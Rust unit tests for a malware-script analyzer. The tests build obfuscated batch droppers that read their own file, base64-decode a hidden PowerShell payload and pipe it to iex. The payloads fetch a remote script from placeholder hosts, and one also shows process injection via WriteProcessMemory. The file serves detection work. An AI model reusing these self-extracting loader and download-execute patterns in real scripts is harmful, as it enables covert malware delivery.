    #[test]
    fn ps1_self_read_marker_base64_payload_is_extracted() {
        use base64::Engine;
        let payload = "$u='https://selfread.example/FLEE.ps1'; Invoke-WebRequest -Uri $u";
        let b64 = base64::engine::general_purpose::STANDARD.encode(payload.as_bytes());
        let script = format!(
            r#"@echo off
powershell -NoP -C "try {{ $Natural = (Get-Content '%~f0') -join [Environment]::NewLine; if ($Natural -match '@rem N86fApRRJbKo4XPoI([A-Za-z0-9+/=]+)') {{ [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($matches[1])) | iex }} }} catch {{}}"
@rem N86fApRRJbKo4XPoI{b64}
"#
        );
        let report = analyze(script.as_bytes(), &Config::default());
        assert!(
            report
                .extracted_ps1_normalized
                .iter()
                .any(|ps| ps.contains("https://selfread.example/FLEE.ps1")),
            "embedded self-read payload was not normalized:\n{:?}",
            report.extracted_ps1_normalized
        );
        assert!(
            report.traits.iter().any(|t| {
                matches!(t, Trait::Download { src, .. } if src.contains("selfread.example/FLEE.ps1"))
            }),
            "embedded self-read payload URL was not extracted: {:?}",
            report.traits
        );
    }

    #[test]
    fn ps1_self_read_marker_base64_carrier_line_is_summarized_without_losing_payload() {
        use base64::Engine;
        let marker = "::remoK3Z8Q5FIG2qXL6SsHa7";
        let payload = format!(
            "Start-Sleep -Seconds 9; [Kernel32]::WriteProcessMemory($proc, $addr, $payload, $payload.Length, [IntPtr]::Zero); $u='https://selfread-marker-long.example/FLEE.ps1'; Invoke-WebRequest -Uri $u;#{}",
            "A".repeat(300 * 1024)
        );
        let b64 = base64::engine::general_purpose::STANDARD.encode(payload.as_bytes());
        let script = format!(
            r#"@echo off
powershell -NoP -C "try {{ $sweep = Get-Content '%~f0' -Raw; if ($sweep -match '{marker}([A-Za-z0-9+/=]+)') {{ [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($matches[1])) | iex }} }} catch {{}}"
exit /b
{marker}{b64}
"#
        );
        let report = analyze(script.as_bytes(), &Config::default());
        assert_eq!(
            crate::self_read_base64_marker_prefixes(&script),
            vec![marker.to_string()],
            "brace marker regex was not recognized"
        );
        assert!(
            report.extracted_ps1.iter().all(|ps| ps.len() < 300 * 1024),
            "large marker payload should not be emitted whole: {:?}",
            report
                .extracted_ps1
                .iter()
                .map(Vec::len)
                .collect::<Vec<_>>()
        );
        assert!(
            report.traits.iter().any(|t| {
                matches!(t, Trait::Download { src, .. }
                    if src.contains("selfread-marker-long.example/FLEE.ps1"))
            }),
            "marker self-read payload URL was not extracted: {:?}",
            report.traits
        );
        assert!(
            report.traits.iter().any(|t| {
                matches!(t, Trait::ProcessInjection { api } if api == "WriteProcessMemory")
            }) && report
                .traits
                .iter()
                .any(|t| matches!(t, Trait::BeaconSleep { seconds } if *seconds == 9)),
            "large marker payload was not fast-scanned: {:?}",
            report.traits
        );
        assert!(
            report
                .deobfuscated
                .contains("rem omitted self-read base64 marker payload"),
            "marker carrier line was not summarized:\n{}",
            report.deobfuscated
        );
        assert!(
            !report.deobfuscated.contains(&b64),
            "marker carrier base64 remained in deobfuscated output"
        );
    }

